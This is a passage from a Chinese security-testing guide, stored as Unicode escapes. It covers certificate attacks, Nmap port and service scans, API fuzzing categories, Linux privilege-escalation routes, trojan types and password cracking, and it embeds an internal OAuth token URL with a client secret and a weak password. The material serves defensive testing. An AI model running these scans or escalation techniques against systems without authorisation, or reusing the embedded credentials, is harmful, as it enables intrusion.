https\uff1a\u670d\u52a1\u7aef\u63a5\u53d7\u5230\u660e\u6587\u5bc6\u7801\u540e\u4f7f\u7528\u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u5bc6\u7801\u8fdb\u884c\u54c8\u5e0c\u52a0\u5bc6SHA256\u5e76\u52a0\u76d0\uff08\u4f7f\u7528\u5b89\u5168\u968f\u673a\u76d0\u503c\uff0c\u957f\u5ea6\u5efa\u8bae\u8ddf\u5bc6\u7801\u6700\u957f\u4e00\u81f4\uff09\uff0c\u518d\u5b58\u5165\u5bc6\u7801\u5bc6\u6587\u548c\u76d0\u503c\u5230\u6570\u636e\u5e93\u3002 5.3.2. *\u8bc1\u4e66* \u00b6 \u6211\u4eec\u4e00\u822c\u8bf4\u7684\u8bc1\u4e66\u90fd\u662f\u670d\u52a1\u7aef\u8bc1\u4e66\uff0c\u5373\u6d4f\u89c8\u5668\u4f7f\u7528\u7684\u9a8c\u8bc1\u670d\u52a1\u5668\u8eab\u4efd\u7684\u8bc1\u4e66\u3002 \u6211\u4eec\u7684\u8bc1\u4e66\u662f\u81ea\u751f\u6210\u7684\u8bc1\u4e66\u3002 \u8bc1\u4e66\uff1a\u8bc1\u660e\u8eab\u4efd\u7684\u51ed\u636e\uff0c\u8bc1\u4e66\u4e2d\u5fc3\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u5bf9\u4fe1\u606f\u53d1\u9001\u8005\u7684\u516c\u94a5\u548c\u4e00\u4e9b\u4fe1\u606f\u4e00\u8d77\u7684\u52a0\u5bc6\uff0c\u8bc1\u4e66\u53ef\u4ee5\u4fdd\u8bc1\u516c\u94a5\u7684\u5b89\u5168\u6027\u548c\u6709\u6548\u65b0\uff0c\u516c\u94a5\u53ef\u4ee5\u9a8c\u8bc1\u79c1\u94a5\u6301\u6709\u65b9\u7684\u8eab\u4efd\u3002\u5e38\u89c4\u4fe1\u606f\u6709\uff1a\u9881\u53d1\u7ed9\u7684\u901a\u7528\u540d\u3001\u7ec4\u7ec7\u3001\u7ec4\u7ec7\u5355\u5143\u3001\u5e8f\u5217\u53f7\u548c\u9881\u53d1\u8005\u7684\u901a\u7528\u540d\u3001\u7ec4\u7ec7\u3001\u7ec4\u7ec7\u5355\u5143\uff0c\u6709\u6548\u65f6\u95f4\u5f00\u59cb\u4e8e\u3001\u8fc7\u671f\u65f6\u95f4\uff0c\u6307\u7eb9SHA-256\u6307\u7eb9\u548cSHA1\u6307\u7eb9\u3002\u8be6\u7ec6\u4fe1\u606f\u8fd8\u6709\u8bc1\u4e66\u7684\u7b7e\u540d\u7b97\u6cd5\u3001\u516c\u94a5\u7b97\u6cd5\u3001\u516c\u94a5\u7b49\u3002 \u7b7e\u540d\u54c8\u5e0c\u7b97\u6cd5\uff1a\u8bc1\u4e66\u7f16\u7801\u5b8c\u6574\u6027\u4fdd\u8bc1\u7684\u54c8\u5e0c\u7b97\u6cd5 \u7b7e\u540d\u7b97\u6cd5\uff1a\u79c1\u94a5\u5bf9\u8bc1\u4e66\u7f16\u7801\u7684\u54c8\u5e0c\u52a0\u5bc6\u7684\u7b97\u6cd5\uff1b\u8bc1\u4e66\u7b7e\u540d\u4f7f\u7528\u7684\u7b97\u6cd5\u662f\u53d1\u5e03\u8005\u81ea\u5df1\u89c4\u5b9a\u7684 \u4e0a\u9762\u4e24\u4e2a\u662f\u53d1\u5e03\u673a\u6784\u641e\u5f97\uff0c\u7528\u6765CA\u9a8c\u8bc1\u7684 \u6307\u7eb9\u7b97\u6cd5\uff1a\u8ba1\u7b97\u51fa\u6307\u7eb9\u7684\u54c8\u5e0c\u7684\u7b97\u6cd5\uff0c\u5c31\u662f\u54c8\u5e0c\u7b97\u6cd5\uff0c\u4e00\u822c\u5c31\u662fsha1 \u6307\u7eb9\uff1a\u8bc1\u4e66\u7684\u54c8\u5e0c\u503c\u5e76\u7528\u79c1\u94a5\u52a0\u5bc6\u3002 \u9274\u522b\u7528\u6237\u7684\u771f\u4f2a\u53ef\u4ee5\u901a\u8fc7\u9274\u522b\u7528\u6237\u7684\u79c1\u94a5\u7684\u771f\u4f2a\u6765\u786e\u8ba4\uff0c\u5c31\u662f\u770b\u52a0\u5bc6\u7684\u4fe1\u606f\u670d\u52a1\u7aef\u662f\u5426\u53ef\u4ee5\u89e3\u5bc6\u3002 \u516c\u94a5\uff1a\u8fde\u63a5\u5efa\u7acb\u65f6\u6d4f\u89c8\u5668\u7aef\u52a0\u5bc6\u65f6\u4f7f\u7528\u7684\u79d8\u94a5\u3002 \u79c1\u94a5\uff1a\u8fde\u63a5\u5efa\u7acb\u65f6\u670d\u52a1\u5668\u7aef\u52a0\u5bc6\u65f6\u4f7f\u7528\u7684\u79d8\u94a5\u3002 \u4f7f\u7528\u65f6\uff1a \u6b65\u9aa4\u4e00\uff1a 1\u3001\u6d4f\u89c8\u5668\u8f93\u5165\u7f51\u5740\u8bbf\u95eeyizhen.cn\uff08\u5e94\u7528\u5c42\u7684\uff09 2\u3001\u6d4f\u89c8\u5668\u5e95\u5c42\u7684TSL\u534f\u8bae\u53d1\u9001\u660e\u6587\u7684Hello\u4fe1\u606f\u7ed9\u670d\u52a1\u5668\uff08\u7f51\u7edc\u5c42\uff09 3\u3001\u670d\u52a1\u5668\u54cd\u5e94\u4e00\u4e2aHello\u4fe1\u606f\u7ed9\u6d4f\u89c8\u5668 \u6b65\u9aa4\u4e8c\uff1a \u670d\u52a1\u5668\u7aef\u53d1\u9001\u5b83\u7684\u8bc1\u4e66\u7ed9\u6d4f\u89c8\u5668\uff08\u56fe\u4e2d\u7684\u4e09\uff0c\u56fe\u4e2d\u7684\u4e8c\u662f\u4e4b\u524d\u5c31\u751f\u6210\u597d\u7684\uff0c\u5b58\u50a8\u5728\u670d\u52a1\u7aef\u7684\u516c\u94a5\u3001\u79c1\u94a5\u3001\u8bc1\u4e66\uff09 \u6b65\u9aa4\u4e09\uff1a 1\u3001\u5ba2\u6237\u7aef\u9a8c\u8bc1\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66 2\u3001\u9a8c\u8bc1\u8bc1\u4e66\u7684\u7b7e\u540d\u3001\u5b8c\u6574\u6027\u7b49\u4fe1\u606f 3\u3001\u53bb\u6d4f\u89c8\u5668\u8bc1\u4e66\u7ba1\u7406\u4e2d\u5fc3\u9a8c\u8bc1\u8bc1\u4e66\u662f\u5426\u53ef\u4fe1\uff0c\u662f\u5426\u4e3a\u53ef\u4fe1\u673a\u6784\u7684\u8bc1\u4e66\u6216\u8005\u5b50\u8bc1\u4e66 4\u3001\u5982\u679c\u4e0d\u53ef\u4fe1\uff0c\u6d4f\u89c8\u5668\u629b\u51fa\u8b66\u544a\uff0c\u63d0\u793a\u7528\u6237\uff0c\u9700\u8981\u7528\u6237\u786e\u8ba4\u9009\u62e9\u662f\u5426\u7ee7\u7eed \u6b65\u9aa4\u56db\uff1a 1\u3001\u6d4f\u89c8\u5668\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u503c\uff0c\u4f5c\u4e3a\u79d8\u94a5\uff0c\u5bf9\u79f0\u52a0\u5bc6\u7684\u79d8\u94a5\uff0c\u6b64\u5904\u5c31\u79f0\u4e3a\u79d8\u94a5\u3002 2\u3001\u4f7f\u7528\u8bc1\u4e66\u4e2d\u7684\u516c\u94a5\u5bf9\u4ea7\u751f\u7684\u79d8\u94a5\u8fdb\u884c\u52a0\u5bc6\u751f\u6210\u5bc6\u6587\u4e32 \u6b65\u9aa4\u4e94\uff1a 1\u3001\u53d1\u9001\u5bc6\u6587\u4e32\u7ed9\u670d\u52a1\u5668 2\u3001\u670d\u52a1\u5668\u63a5\u53d7\u5230\u5bc6\u6587\u4e32\uff0c\u4f7f\u7528\u8bc1\u4e66\u7684\u79c1\u94a5\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u5bf9\u79f0\u52a0\u5bc6\u7684\u79d8\u94a5\u3002 3\u3001\u670d\u52a1\u5668\u4f7f\u7528\u5bf9\u79f0\u79d8\u94a5\u52a0\u5bc6\u54cd\u5e94\u62a5\u6587\u5185\u5bb9\u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\u3002 \u6b65\u9aa4\u516d\uff1a \u670d\u52a1\u5668\u548c\u6d4f\u89c8\u5668\u53ef\u4ee5\u901a\u8baf\u4e86\u3002 \u6d4f\u89c8\u5668\u53d1\u9001\u7684\u6570\u636e\u90fd\u662f\u516c\u94a5\u52a0\u5bc6\uff0c\u4f7f\u7528\u5bf9\u79f0\u79d8\u94a5\u89e3\u5bc6\u6536\u5230\u7684\u6570\u636e\u3002 \u670d\u52a1\u5668\u53d1\u9001\u7684\u6570\u636e\u90fd\u662f\u5bf9\u79f0\u79d8\u94a5\u52a0\u5bc6\u7684\uff0c\u6536\u5230\u7684\u6570\u636e\u4f7f\u7528\u79c1\u94a5\u89e3\u5bc6\u3002 \u7b80\u5355\u793a\u610f\u56fe\u5982\u4e0b\uff1a *\u8bc1\u4e66\u4ecb\u7ecd\u548c\u653b\u51fb* Pem\u683c\u5f0f\u7684\u8bc1\u4e66\u8be6\u7ec6\u4fe1\u606f\u67e5\u770b\uff1a https://www.trustasia.com/tools/cert-decoder.htm SSL\u8bc1\u4e66\u88ab\u653b\u51fb\u3001\u5047\u5192\u7684\u98ce\u9669\u5206\u6790 http://wenku.baidu.com/link?url=LkghTfA11JWJBLFJrgBZfCrIBFJoqfcH1q4xBEbzt3xmGtkR7mdkV91mUnRobYQKYz2ekVTo7XNQdOMHIuOpWZv4TBDBVsBo52dYNeX1zRi \u4e00\u4e2a\u5408\u6cd5\u6709\u6548\u7684SSL\u8bc1\u4e66\u8bef\u7b7e\u53d1\u7ed9\u4e86\u5047\u5192\u8005\uff08--\uff09 \u7834\u89e3SSL\u8bc1\u4e66\u7b7e\u53d1CA\u7684\u79c1\u94a5\uff08\u5173\u6ce8\u7b7e\u540d\u7b97\u6cd5\uff09 SSL\u8bc1\u4e66\u7b7e\u53d1CA\u7684\u79c1\u94a5\u6cc4\u9732\uff08\u5982\u679c\u662f\u81ea\u7b7e\u540d\u8bc1\u4e66\u9700\u8981\u5173\u6ce8\uff09 \u7834\u89e3SSL\u8bc1\u4e66\u7684\u79c1\u94a5\uff08\u5173\u6ce8\u6307\u7eb9\u7b97\u6cd5\uff09 SSL\u8bc1\u4e66\u7684\u79c1\u94a5\u6cc4\u9732\uff08\u670d\u52a1\u5668\u7aef\u79c1\u94a5\u7684\u5b58\u8d2e\uff09 \u8ba4\u8bc1\u673a\u6784\u4e3b\u52a8\u4e3a\u5047\u5192\u7f51\u7ad9\u7b7e\u53d1\u5408\u6cd5\u6709\u6548\u7684\u8bc1\u4e66\uff08--\uff09 \u5229\u7528\u53ef\u4fe1\u7684SSL\u670d\u52a1\u5668\u8bc1\u4e66\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff08--\uff09 \u5728\u7528\u6237\u4e3b\u673a\u4e2d\u690d\u5165\u4f2a\u9020\u7684\u6839CA\u8bc1\u4e66\uff08\u6216\u4e00\u4e2a\u5b8c\u6574\u7684CA\u8bc1\u4e66\u94fe\uff09\uff08--\uff09 \u65c1\u8def\u8bc1\u4e66\u7684\u53ef\u4fe1\u6027\u7684\u9a8c\u8bc1\uff08--\u6d4f\u89c8\u5668\u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\uff09 ---\u5982\u679c\u8bc1\u4e66\u7684\u8ddf\u8bc1\u4e66\u6ca1\u6709\uff0c\u7b2c\u4e00\u6b21\u8bbf\u95ee\u4f1a\u53bb\u8bc1\u4e66\u7f51\u7ad9\u83b7\u53d6\u6839\u8bc1\u4e66\u6216\u8005\u4e2d\u95f4\u8bc1\u4e66 5.3.2.1. *\u8bc1\u4e66\u52a0\u5bc6\u7b97\u6cd5\u7684\u68c0\u67e5* \u00b6 1\u3001\u8bc1\u4e66\u7684\u6307\u7eb9\u7b97\u6cd5\u662f\u5426\u5b89\u5168\uff0c\u4e0d\u5b89\u5168\u7684\u7b97\u6cd5\u9020\u6210\u8bc1\u4e66\u52a0\u5bc6\u4f20\u8f93\u7684\u4fe1\u606f\u53ef\u4ee5\u88ab\u89e3\u5bc6 2\u3001\u8bc1\u4e66\u7684\u7b7e\u540d\u7b97\u6cd5\u662f\u5426\u5b89\u5168\uff0c\u4e0d\u5b89\u5168\u7684\u7b7e\u540d\u7b97\u6cd5\u53ef\u80fd\u9020\u6210\u8bc1\u4e66\u88ab\u4f2a\u9020 5.3.2.2. *\u8bc1\u4e66\u5bf9\u5e94\u7684\u79d8\u94a5\u4fdd\u5b58\u68c0\u67e5* \u00b6 1\u3001\u8bc1\u4e66\u79c1\u94a5\u5728\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u662f\u5426\u52a0\u5bc6 2\u3001\u8bc1\u4e66\u79c1\u94a5\u5728\u670d\u52a1\u5668\u7aef\u7684\u5b58\u50a8\u6587\u4ef6\u6743\u9650\u662f\u5426\u53ea\u6709\u6240\u6709\u8005\u53ef\u4ee5\u8bbf\u95ee ----\u6d4f\u89c8\u5668\u7aef\u5ba2\u6237\u7684CA\u6839\u8bc1\u4e66\u662f\u5426\u5b89\u5168\u53ef\u4fe1\uff0c\u8fd9\u4e2a\u65e0\u6cd5\u4fdd\u8bc1\uff08\u4e0d\u6d89\u53ca\uff09 5.3.3. *\u660e\u6587\u5bc6\u7801* \u00b6 \u5ba2\u6237\u7aef 1\u3001\u6d4f\u89c8\u5668Cookie\u4e2d\u5b58\u50a8\uff0c\u6d4f\u89c8\u5668Cookie\u4e2d\u8bb0\u5f55\u5bc6\u6587\u5bc6\u7801 2\u3001\u6d4f\u89c8\u5668\u8bb0\u5f55\u5bc6\u7801\u4fdd\u5b58\u660e\u6587\u5bc6\u7801 \u670d\u52a1\u7aef\u660e\u6587\u5bc6\u7801\u68c0\u67e5 1\u3001 \u914d\u7f6e\u6587\u4ef6\u660e\u6587\u5bc6\u7801 2\u3001\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u660e\u6587\u5bc6\u7801 3\u3001\u7a0b\u5e8f\u4e2d\u786c\u7f16\u7801\u5bc6\u7801\u3001\u5bc6\u94a5 \uff08\u9488\u5bf9\u79d8\u94a5\u573a\u666f\u7684\u7406\u89e3\uff0c\u4e3b\u8981\u9488\u5bf9\u5f53\u524d\u7684\u5f31\u7b97\u6cd5\u79d8\u94a5\u7206\u7834\u7684\u573a\u666f\uff0c\u539f\u7406\u662f\u901a\u8fc7\u5bf9\u591a\u6b21\u7684\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u5bf9\u6bd4\u5dee\u5f02\u5c1d\u8bd5\u63a8\u5012\u79d8\u94a5\uff0c\u6709\u4e9b\u573a\u666f\u53ef\u4ee5\u8ba4\u4e3a\u662f\u5206\u95ee\u9898\u7684\uff0c\u5982\u6570\u636e\u5e93\u5bc6\u7801\u4ee5DES\u52a0\u5bc6\u5bc6\u6587\u5b58\u50a8\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u5bc6\u94a5\u5728\u4ee3\u7801\u4e2d\u786c\u7f16\u7801\uff0c\u8fd9\u79cd\u573a\u666f\u7684\u5bc6\u94a5\u786c\u7f16\u7801\u5c31\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u4ed6\u7684\u5bc6\u94a5\u5728\u914d\u7f6e\u6587\u4ef6\u548c\u4ee3\u7801\u4e2d\u5176\u5b9e\u6ca1\u6709\u591a\u5927\u533a\u522b\u3002\uff09 5.3.4. *\u6e90\u4ee3\u7801\u654f\u611f\u4fe1\u606f\u68c0\u67e5* \u00b6 \u4f7f\u7528search and replace\u641c\u7d22\u4ee3\u7801\u4e2d\u7684\u5173\u952e\u5b57\u3001\u654f\u611f\u5b57\uff0c\u67e5\u770b\u662f\u5426\u6709\u4e0d\u5f53\u4f7f\u7528\u7684\u5730\u65b9 1\u3001passwd\u3001password\u3001pword\u7b49 2\u3001\u4f7f\u7528\u8fc7\u7684\u5bc6\u7801111111,123456\uff0cadmin\uff0camol\u7b49 5.4. *\u534f\u8bae**** *\u4e0e********\u63a5\u53e3********\u653b\u9632**** \u00b6 5.4.1. *\u7aef\u53e3\u626b\u63cf* \u00b6 1\u3001\u8fdc\u7aef\u626b\u63cf\u5de5\u5177Nmap \u7aef\u53e3\u626b\u63cf\u547d\u4ee4 TCP\uff0cNmap -sS -T4 -p 1-65535 -oX filename.xml IP UDP\uff0cNmap -sU -T4 -p 1-65535 -oX filename.xml IP 2\u3001\u7cfb\u7edf\u68c0\u6d4b \u68c0\u67e5\u670d\u52a1\u5668\u7684\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b\u53ca\u7248\u672c Nmap \u2013O IP 3\u3001\u8fd1\u7aef\u7aef\u53e3\u4fe1\u606f\u68c0\u67e5 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7aef\u53e3\u8be6\u7ec6\u4fe1\u606f lsof \u2013i:port ps \u2013ef|grep pid 4\u3001\u6574\u7406\u7cfb\u7edf\u5f00\u653e\u7aef\u53e3\u7684\u8be6\u7ec6\u5217\u8868 5.4.2. *\u7aef\u53e3\u670d\u52a1\u63a2\u6d4b* \u00b6 1\u3001\u4f7f\u7528\u547d\u4ee4nmap -sV -Pn -p port IP\uff0c\u63a2\u6d4b\u7aef\u53e3\u7684\u8be6\u7ec6\u670d\u52a1\u53ca\u7248\u672c -Pn\uff1a\u5728\u626b\u63cf\u4e4b\u524d\uff0c\u4e0d\u53d1\u9001ICMP echo\u8bf7\u6c42\u6d4b\u8bd5\u76ee\u6807\u662f\u5426\u6d3b\u8dc3\u3002 -sV\uff1a\u63a2\u7d22\u5f00\u653e\u7684\u7aef\u53e3\uff0c\u786e\u5b9a\u670d\u52a1\u5668/\u7248\u672c\u4fe1\u606f 5.4.3. *REST WEB Service\uff08\u63a5\u53e3\u534f\u8bae\uff09* \u00b6 5.4.4. *SOAP* \u00b6 Soap\u6ce8\u5165 5.4.5. *SSH\u534f\u8bae* \u00b6 \u653e\u5230\u64cd\u4f5c\u7cfb\u7edf\u90e8\u5206\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u548c\u64cd\u4f5c\u7cfb\u7edf\u5f3a\u76f8\u5173 5.4.6. *IM\u670d\u52a1-XMPP\u534f\u8bae* \u00b6 http ://wiki.xmpp.org/web/Securing_XMPP IM\u670d\u52a1\u68c0\u67e5\uff1a https://xmpp.net Tigase\u7528\u6237\u6307\u5357\uff1a http://docs.tigase.org/tigase-server/snapshot/Administration_Guide/html_chunk/index.html Tigase XMPP (Jabber) server ver 7.0.2 IM\u670d\u52a1\u5668\u5982\u4f55\u6d4b\u8bd5\uff1f\uff1f\uff1f http://my.oschina.net/greki/blog/210393 Tigase-server Tigase-client http://localhost:8080/setup/\u8fdb\u5165tigase\u540e\u53f0 5.4.7. *\u5916\u90e8\u63a5\u53e3\u5b89\u5168* \u00b6 \u83b7\u53d6token\uff1a http://192.168.1.120:8080/amol-back/oauth/token?client_id=amol_client_mbox&client_secret=amol_secret_mbox&grant_type=password&username=mbox&password=123456 1\u3001\u94fe\u8def\u52a0\u5bc6 2\u3001\u53c2\u6570\u6821\u9a8c - 3\u3001\u8bbf\u95ee\u6570\u9650\u5236- \u53c2\u6570\uff1a \u4f7f\u7528burp\u904d\u5386\u7528\u4f8bpayload 1)\u7279\u6b8a\u5b57\u7b26 \u82f1\u6587\u5b57\u7b26 [~!@#$%^&*()____+{}|:\u201d<>?-=;\u2019,./ ](mailto:~!@#$%^&*()____+{}|:\\\u201d<>?-=;\u2019,./ ) \u4e2d\u6587\u5b57\u7b26 ~\uff01@#\uffe5%\u2026\u2026&*\uff08\uff09\u2014\u2014+\uff1a\u201c\u300a\u300b\uff1f\uff0c\u3002\u3001\u2018\uff1b\u3001\u3011\u3010\u00b7 \u4e2d\u6587\u6c49\u5b57 \u54c8\u54c8 2\uff09sql\u6ce8\u5165 3\uff09XSS 4\uff09\u7eaf\u6570\u5b57\u3001\u7eaf\u82f1\u6587\u3001\u7ec4\u5408\u3001\u5927\u5c0f\u5199\u3001 5\uff09\u6362\u884c 6\uff09\u8d85\u957f 7\uff09\u7a7a 5.4.8. *SSL/TSL* \u00b6 https\u7b49\u5176\u4ed6\u534f\u8bae\u4f7f\u7528\u7684\u52a0\u5bc6\u534f\u8baeSSL/TSL\u662f\u5426\u662f\u5b89\u5168\u7684\uff0c\u4f7f\u7528\u5f00\u6e90\u5de5\u5177sslsplit\u68c0\u6d4b\uff0c\u5de5\u5177\u4e0b\u8f7d\u5730\u5740https://github.com/droe/sslsplit/tree/7677fe06557509e95e548318909c1a328b6f6069\u3002 \u68c0\u67e5\u52a0\u534f\u8bae\u7248\u672c\u53ca\u5957\u4ef6\u7684\u529e\u6cd5Nmap -sV -p port --script ssl-enum-ciphers ip 1\u3001\u52a0\u5bc6\u534f\u8baeSSLv2v3\u9700\u8981\u5168\u90e8\u7981\u7528 2\u3001TSL\u7684\u52a0\u5bc6\u5bc6\u5957\u4ef6\u90e8\u5206\u5df2\u7ecf\u4e0d\u5b89\u5168\u9700\u8981\u914d\u7f6e\u5220\u9664 5.4.9. *WiFi\u5b89\u5168* \u00b6 \u5bf9\u8c61\uff08Wep\u3001Wpa\uff09\u3001\u539f\u7406\u3001\u5de5\u5177 5.5. *\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168* \u00b6 http://www.centoscn.com/CentosSecurity/ \u5de5\u5177\uff1aopenvas\u3001nessus \u6d4b\u8bd5\u65b9\u5f0f\uff1a\u53ef\u5728\u672c\u5730\u5b89\u88c5nessus home\u7248\u5b8c\u6765\u6d4b\u8bd5 \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e CVE-2016-5195\uff1aLinux\u7cfb\u7edf\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\uff0c\u810f\u725b\u6f0f\u6d1e\u3002\uff082016-10\uff09\u3010\u901a\u5403\u578b\u3011\u3002 5.5.1. *\u672c\u5730\u63d0\u6743* \u00b6 1\uff09Windows\u4e0b\u63d0\u6743\uff08\u6211\u4eec\u662flinux\u670d\u52a1\u5668\uff0c\u8fd9\u4e2a\u6682\u65f6\u4e0d\u5173\u6ce8\uff09 2\uff09Linux\u4e0b\u63d0\u6743---- l \u5229\u7528\u7cfb\u7edf\u6f0f\u6d1e\u63d0\u6743\uff08\u4e3b\u52a8\u63d0\u6743\uff09 l \u914d\u7f6e\u4e0d\u5f53\u63d0\u6743\uff08\u88ab\u52a8\u63d0\u6743\uff09 Sudo\u63d0\u6743---/etc/sudoers\u6587\u4ef6\u914d\u7f6e Crontab\u63d0\u6743--\u5b9a\u65f6\u6267\u884c\u7684\u811a\u672c\u7684\u6743\u9650\u914d\u7f6e Init.d\u63d0\u6743--/etc/init.d\u6b64\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u7684\u5199\u6743\u9650\u8981\u4e25\u683c\u7981\u6b62 Environment\u63d0\u6743--\u7528\u6237\u7684profile\u3001environment\u7b49\u7684\u6743\u9650\u8bbe\u7f6e\u3001\u8fd8\u6709su\u547d\u4ee4\u800c\u4e0d\u662fsu - \u65b9\u5f0f\u5207\u6362\u5230root\u7528\u6237 Setuid\u63d0\u6743--\u901a\u8fc7\u7ed9\u811a\u672c\u6216\u8005bash\u6dfb\u52a0s\u6743\u9650\u83b7\u53d6root\u6743\u9650 5.5.2. *\u5404\u79cd\u6728\u9a6c* \u00b6 \u952e\u76d8\u8bb0\u5f55\u6728\u9a6c \u7ed1\u5b9a\u7aef\u53e3\u6728\u9a6c \u56de\u8fde\u6728\u9a6c \u7aef\u53e3\u590d\u7528\u6728\u9a6c \u8fdc\u7a0b\u63a7\u5236\u6728\u9a6c 5.5.3. *\u5bc6\u7801\u7834\u89e3* \u00b6 \u672c\u5730\u7834\u89e3--md5\u3001linux shadow\u3001ntlm/lm \u8fdc\u7a0b\u7834\u89e3--ssh\u3001httpauth\u3001webform\u3001pop/Smtp 5.6. *\u6570\u636e\u5e93\u5b89\u5168* \u00b6 Mysql http://www.w3resource.com/mysql/mysql-security.php Redis \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e\uff1a CVE-2016-6662 mysql\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u3002\uff082016-9\uff09 5.7. *\u8f6f\u4ef6\u7684\u53d1\u5e03\u4e0e\u5b89\u88c5\u5b89\u5168* \u00b6 1\u3001\u4e0b\u8f7d\u7684\u8f6f\u4ef6\u6709\u6ca1\u6709\u63d0\u4f9b\u7b7e\u540d 2\u3001\u4e0b\u8f7d\u540e\u5b89\u88c5\u662f\u5426\u6709\u6821\u9a8c\u673a\u5236 5.8. *\u624b\u673a\u7aef\u7684\u5b89\u5168* \u00b6 1\u3001app\u7684\u7b7e\u540d\u3001\u53cd\u9006\u5411 \uff08apk\u52a0\u56fa\u6b65\u9aa4\uff1a http://jingyan.baidu.com/article/b2c186c8cd1a71c46ef6ffcd.html \uff0c\u6570\u5b57\u7b7e\u540d\uff1a http://blog.csdn.net/kickxxx/article/details/18252881 \uff09 2\u3001\u7528\u6237\u9690\u79c1 \u672c\u5730\u4fdd\u5b58\u7528\u6237\u5bc6\u7801\u3001\u65e0\u8bba\u52a0\u5bc6\u4e0e\u5426 \u654f\u611f\u4fe1\u606f\u9690\u79c1\u4fe1\u606f\uff0c\u5982\u804a\u5929\u8bb0\u5f55\u3001\u5173\u7cfb\u94fe\u3001\u94f6\u884c\u5361\u53f7\u7b49\u662f\u5426\u52a0\u5bc6\u4fdd\u5b58 \u914d\u7f6e\u6587\u4ef6\u7b49\u662f\u5426\u4fdd\u5b58\u5230\u5916\u90e8\u8bbe\u5907\u4e0a \u4fdd\u5b58\u5230\u5916\u90e8\u8bbe\u5907\u7684\u4fe1\u606f\u52a0\u8f7d\u524d\u5224\u65ad\u662f\u5426\u88ab\u7be1\u6539 3\u3001\u6587\u4ef6\u6743\u9650 App\u6240\u5728\u76ee\u5f55\u4e0d\u5141\u8bb8\u5176\u4ed6\u7ec4\u6210\u5458\u8bfb\u5199 4\u3001\u7f51\u7edc\u901a\u8baf \u91cd\u8981\u654f\u611f\u6570\u636e\u4f20\u8f93\u52a0\u5bc6 5\u3001\u8fd0\u884c\u65f6\u89e3\u91ca\u4fdd\u62a4 \u5d4c\u6709\u89e3\u91ca\u5668\u7684\u8f6f\u4ef6XSS\u3001SQL\u6ce8\u5165\u7b49 \u5916\u90e8\u8fde\u63a5\u7684\u662f\u5426\u6709URL\u6b3a\u9a97\u7b49\u6f0f\u6d1e 6\u3001\u7ec4\u4ef6\u6743\u9650\u4fdd\u62a4 \u7981\u6b62App\u5185\u90e8\u7ec4\u4ef6\u88ab\u4efb\u610f\u7b2c\u4e09\u65b9\u7a0b\u5e8f\u8c03\u7528 \u8c03\u7528\u5916\u90e8\u7ec4\u4ef6\u5148\u9a8c\u8bc1\u7b7e\u540d 7\u3001\u5347\u7ea7 \u5347\u7ea7\u5305\u5b8c\u6574\u6027\u3001\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u907f\u514d\u88ab\u52ab\u6301 8\u30013rd\u5e93 \u8ddf\u8fdb\u7b2c\u4e09\u65b9\u5e93\u7684\u66f4\u65b0 http://blog.nsfocus.net/mobile-app-security-security-test/ http://www.zhihu.com/question/24083362 5.9. *\u9759\u6001\u4ee3\u7801\u5206\u6790\uff08\u7eaf\u767d\u76d2\uff09* \u00b6 1\u3001\u5371\u9669\u51fd\u6570\u3001\u65b9\u6cd5\u3001\u5173\u952e\u5b57 2\u3001\u5de5\u5177\u68c0\u6d4b findbugs 3\u3001\u903b\u8f91\u6f0f\u6d1e 5.10. *\u6293\u5305\u8d70\u8bfb\u4ee3\u7801\uff08\u7070\u76d2\u6d4b\u8bd5\uff09* \u00b6 1\u3001\u524d\u53f0\u529f\u80fd\u6267\u884c\u3001\u4e2d\u95f4\u5de5\u5177\u6293\u5305\u3001\u540e\u7aef\u4ee3\u7801\u8d70\u8bfb\u7684\u5f62\u5f0f\uff08\u8fc7\u7a0b\uff1a\u7ed3\u5408\u4e1a\u52a1\u601d\u8def\u67e5\u770b\u4e2d\u95f4\u53c2\u6570\u3001\u8d70\u8bfb\u540e\u7aef\u4ee3\u7801\u8ddf\u8e2a\u53c2\u6570\u5904\u7406\uff0c\u7ed3\u5408\u5e38\u89c1WEB\u5b89\u5168\u6f0f\u6d1e\u5f62\u5f0f\u5339\u914d\u95ee\u9898\uff0c\u6293\u5305\u91cd\u653e\u9a8c\u8bc1\u95ee\u9898\u3002\uff09 2\u3001\u53ef\u53d1\u73b0\u7684\u5e38\u89c1\u6f0f\u6d1e\u5f62\u5f0f\uff1a\u8d8a\u6743\u3001XSS\u3001sql\u6ce8\u5165\u3001\u53c2\u6570\u5408\u7406\u6027\u7b49 6. *\u5b89\u5168\u6d4b\u8bd5\u7684\u539f\u5219* \u00b6 \u653b\u51fb\u9762\u6700\u5c0f\u5316 \u9ed8\u8ba4\u5b89\u5168 \u6700\u5c0f\u6743\u9650\u539f\u5219 \u6df1\u5ea6\u9632\u5fa1\u539f\u5219\uff08\u591a\u89d2\u5ea6\u3001\u5197\u4f59\u7684\uff09 \u5b89\u5168\u7684\u5931\u8d25 \u5916\u90e8\u7cfb\u7edf\u662f\u4e0d\u5b89\u5168\u7684 \u804c\u8d23\u5206\u79bb\uff08\u6743\u503c\u5206\u79bb\uff09 \u4e0d\u4f9d\u8d56\u9690\u6666\u7684\u5b89\u5168\u6027 \u7b80\u5355 \u6b63\u786e\u7684\u4fee\u590d\u5b89\u5168\u6027\u95ee\u9898 